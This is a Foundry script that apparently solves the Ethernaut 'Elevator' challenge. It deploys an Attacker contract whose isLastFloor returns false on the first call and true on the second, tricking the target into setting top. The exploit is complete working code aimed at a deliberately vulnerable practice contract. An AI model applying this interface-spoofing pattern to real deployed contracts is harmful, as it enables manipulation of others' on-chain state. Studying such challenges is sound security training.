// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Elevator.sol";

contract Attacker {
    Elevator elevator = Elevator(0x7D67D4cc650CE6dd92c00e07f8b25c014DC02e88);
    uint256 public counter = 0;
    constructor() {

    }

    function goToLastFloor(uint256 _floor) external {
        elevator.goTo(_floor);
    } 

    function isLastFloor(uint256) external returns (bool) {
        counter++;
        return counter > 1 ? true : false;
    }
}

contract ElevatorScript is Script {

    Elevator public elevator = Elevator(0x7D67D4cc650CE6dd92c00e07f8b25c014DC02e88);
    /**
     * Solution: 
     * 1. We need to deploy a contract that implements the method form the interface isLastFloor.
     * 2. In the method we increment a counter. 
     * 3. building.isLastFloor(_floor) is called twice, the first time must be false, and second must be true
     * 4. in the isLastFloor in implement the logic so the first time it's false, and the second is true.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();

        console.log("1. Is top", elevator.top());
        attacker.goToLastFloor(1);
        console.log("2. Is top", elevator.top());
       
        vm.stopBroadcast();

    }
}
